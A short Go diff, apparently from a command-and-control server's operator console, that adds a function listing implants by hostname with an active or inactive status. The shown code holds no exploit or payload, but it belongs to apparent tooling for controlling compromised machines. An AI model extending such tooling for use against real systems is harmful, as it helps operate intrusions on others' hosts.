@@ -12,6 +12,14 @@ import (
 var pendingCommand string
 var outputDone = make(chan bool)
 
+func listImplants() {
+	status := "inactive"
+	if implant.Active {
+		status = "active"
+	}
+
+	fmt.Printf("[+] ID:%s Status:%s\n", implant.Hostname, status)
+}
 func getUserInput() {
 	input := bufio.NewReader(os.Stdin)
 
@@ -25,7 +33,7 @@ func getUserInput() {
 
 		command = strings.TrimSpace(command)
 		if command == "implants" {
-			fmt.Println(implant.Hostname)
+			listImplants()
 			continue
 		}
 
